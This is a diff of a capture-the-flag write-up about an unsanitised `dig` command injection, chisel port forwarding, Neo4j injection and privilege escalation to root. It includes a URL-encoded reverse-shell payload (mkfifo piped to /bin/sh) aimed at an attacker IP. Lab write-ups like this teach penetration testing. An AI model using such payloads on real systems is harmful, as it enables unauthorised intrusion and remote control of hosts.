@@ -193,7 +193,7 @@ def sendmessage(email, subject, message, ip):
 		return status
 ```
 
-Long code, but basically `insecure` checks for certain characters within the message we send, and afterwards send an email to somewhere else.&#x20;
+Long code, but basically `insecure` checks for certain characters within the message we send, and afterwards send an email to somewhere else.
 
 The vulnerability lies here: `result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)`. This takes the domain part of the email without sanitisation and inserts it into a command. We can easily get RCE using `|`. By sending this query, I got a shell as `www-data`.
 
@@ -220,7 +220,7 @@ name=test&email=test%40website.com+|+rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin
 
 ## Privilege Escalation
 
-There are 2 main users within the machine, `dev` and `john`. We don't have access to them at all.&#x20;
+There are 2 main users within the machine, `dev` and `john`. We don't have access to them at all.
 
 ### Port Fowarding
 
@@ -264,7 +264,7 @@ chisel server -p 5555 --reverse
 ./chisel client 10.10.14.5:5555 R:1080:socks
 ```
 
-Trying to use `proxychains` with Firefox didn't really work for some reason, so I changed the command to only forward port 8001.&#x20;
+Trying to use `proxychains` with Firefox didn't really work for some reason, so I changed the command to only forward port 8001.
 
 ### Neo4j Injection
 
@@ -361,4 +361,4 @@ Then, we can just run the command to download it.
 
 <figure><img src="../../.gitbook/assets/image (3785).png" alt=""><figcaption></figcaption></figure>
 
-We can easily get a root shell at this point.&#x20;
+We can easily get a root shell at this point.
